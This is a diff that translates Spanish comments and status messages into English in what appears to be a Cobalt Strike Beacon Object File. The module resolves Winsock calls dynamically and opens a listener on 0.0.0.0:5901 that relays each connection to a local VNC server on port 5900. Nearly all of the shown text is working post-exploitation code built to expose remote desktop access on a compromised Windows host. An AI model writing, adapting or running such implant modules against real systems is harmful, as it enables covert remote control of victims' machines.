@@ -22,7 +22,7 @@
 #include "beacon.h"
 
 // ================================
-// IMPORTS DIRECTOS
+// DIRECT IMPORTS
 // ================================
 extern PVOID __imp_LoadLibraryA;
 extern PVOID __imp_GetProcAddress;
@@ -31,7 +31,7 @@ extern PVOID __imp_VirtualFree;
 extern PVOID __imp_CloseHandle;
 
 // ================================
-// TIPOS
+// TYPES
 // ================================
 typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR);
 typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
@@ -39,7 +39,7 @@ typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL (WINAPI *VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
 
 // ================================
-// FUNCIONES DE RED
+// NETWORK FUNCTIONS
 // ================================
 typedef int (WINAPI *WSASTARTUP)(WORD, LPWSADATA);
 typedef SOCKET (WINAPI *SOCKETFN)(int, int, int);
@@ -54,7 +54,7 @@ typedef int (WINAPI *CLOSESOCKET)(SOCKET);
 typedef int (WINAPI *WSACLEANUP)(void);
 typedef int (WINAPI *WSAGETLASTERROR)(void);
 typedef ULONG (WINAPI *HTONL)(ULONG);
-typedef USHORT (WINAPI *HTONS)(USHORT); // ✅ ¡Nuevo! htons para puertos
+typedef USHORT (WINAPI *HTONS)(USHORT); // New! htons for ports
 
 // ================================
 // FD_ISSET MANUAL
@@ -127,30 +127,30 @@ void relay_traffic(SOCKET client_sock, SOCKET vnc_sock) {
 }
 
 // ================================
-// FUNCIÓN PRINCIPAL — ¡CORREGIDO!
+// MAIN FUNCTION -- FIXED!
 // ================================
 void go(char *args, int alen) {
-    BeaconPrintf(CALLBACK_OUTPUT, "[VNC RELAY] Iniciando relay en 0.0.0.0:5901 → 127.0.0.1:5900\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[VNC RELAY] Starting relay on 0.0.0.0:5901 -> 127.0.0.1:5900\n");
 
     HMODULE hWs2_32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("ws2_32.dll");
     if (!hWs2_32) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo cargar ws2_32.dll\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Could not load ws2_32.dll\n");
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] ws2_32.dll cargada\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] ws2_32.dll loaded\n");
 
     WSASTARTUP pWSAStartup = (WSASTARTUP)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "WSAStartup");
     if (!pWSAStartup) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo resolver WSAStartup\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Could not resolve WSAStartup\n");
         return;
     }
 
     WSADATA wsaData;
     if (pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] WSAStartup falló\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] WSAStartup failed\n");
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] WSAStartup exitoso\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] WSAStartup successful\n");
 
     SOCKETFN pSocket = (SOCKETFN)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "socket");
     BIND pBind = (BIND)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "bind");
@@ -159,51 +159,51 @@ void go(char *args, int alen) {
     CONNECT pConnect = (CONNECT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "connect");
     CLOSESOCKET pCloseSocket = (CLOSESOCKET)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "closesocket");
     WSAGETLASTERROR pWSAGetLastError = (WSAGETLASTERROR)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "WSAGetLastError");
-    HTONS phtons = (HTONS)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "htons"); // ✅ ¡htons para puertos!
+    HTONS phtons = (HTONS)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hWs2_32, "htons"); // New! htons for ports
 
     if (!pSocket || !pBind || !pListen || !pAccept || !pConnect || !pCloseSocket || !pWSAGetLastError || !phtons) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudieron resolver funciones de socket\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Could not resolve socket functions\n");
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Funciones de socket resueltas\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Socket functions resolved\n");
 
     SOCKET listen_sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (listen_sock == INVALID_SOCKET) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] socket() falló\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] socket() failed\n");
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Socket de escucha creado\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Listening socket created\n");
 
     struct sockaddr_in server_addr = {0};
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
-    server_addr.sin_port = phtons(5901); // ✅ ¡CORREGIDO! htons, no htonl
+    server_addr.sin_port = phtons(5901); // FIXED! htons, not htonl
 
     if (pBind(listen_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
         int error = pWSAGetLastError();
-        BeaconPrintf(CALLBACK_ERROR, "[-] bind() falló con error: %d\n", error);
+        BeaconPrintf(CALLBACK_ERROR, "[-] bind() failed with error: %d\n", error);
         pCloseSocket(listen_sock);
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] bind() exitoso\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] bind() successful\n");
 
     if (pListen(listen_sock, SOMAXCONN) == SOCKET_ERROR) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] listen() falló\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] listen() failed\n");
         pCloseSocket(listen_sock);
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] listen() exitoso\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] listen() successful\n");
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] ✅ Escuchando en 0.0.0.0:5901 — ¡Listo para conexiones VNC!\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Listening on 0.0.0.0:5901 -- Ready for VNC connections!\n");
 
     while (1) {
         SOCKET client_sock = pAccept(listen_sock, NULL, NULL);
         if (client_sock == INVALID_SOCKET) {
             int error = pWSAGetLastError();
-            BeaconPrintf(CALLBACK_ERROR, "[-] accept() falló con error: %d\n", error);
+            BeaconPrintf(CALLBACK_ERROR, "[-] accept() failed with error: %d\n", error);
             continue;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] ¡Nueva conexión aceptada!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] New connection accepted!\n");
 
         SOCKET vnc_sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (vnc_sock == INVALID_SOCKET) {
@@ -214,18 +214,18 @@ void go(char *args, int alen) {
         struct sockaddr_in vnc_addr = {0};
         vnc_addr.sin_family = AF_INET;
         vnc_addr.sin_addr.s_addr = htonl(0x7F000001); 
-        vnc_addr.sin_port = phtons(5900);          // ✅ ¡htons, no htonl!
+        vnc_addr.sin_port = phtons(5900);          // htons, not htonl!
 
         if (pConnect(vnc_sock, (struct sockaddr*)&vnc_addr, sizeof(vnc_addr)) == SOCKET_ERROR) {
             int error = pWSAGetLastError();
-            BeaconPrintf(CALLBACK_ERROR, "[-] connect() al VNC local falló con error: %d\n", error);
+            BeaconPrintf(CALLBACK_ERROR, "[-] connect() to local VNC failed with error: %d\n", error);
             pCloseSocket(vnc_sock);
             pCloseSocket(client_sock);
             continue;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] ¡Conectado al VNC local!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to local VNC!\n");
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] ¡Iniciando relay de tráfico VNC!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting VNC traffic relay!\n");
         relay_traffic(client_sock, vnc_sock);
 
         pCloseSocket(vnc_sock);
